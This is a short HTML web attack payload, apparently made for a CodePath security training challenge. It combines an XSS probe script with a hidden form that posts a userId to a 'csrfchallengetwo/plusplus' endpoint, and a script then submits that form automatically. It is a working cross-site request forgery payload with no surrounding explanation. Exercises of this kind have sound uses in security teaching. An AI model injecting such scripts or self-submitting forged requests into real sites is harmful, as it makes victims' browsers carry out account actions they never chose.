<SCRIPT>alert('XSS')</SCRIPT>
<form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
 <input type="hidden" name="userId" value="910799f4f87245cd9c6a00924346f1252a3b401d" />
 <input type="submit"/>
</form>
<script>
 document.csrfForm.submit();
</script>
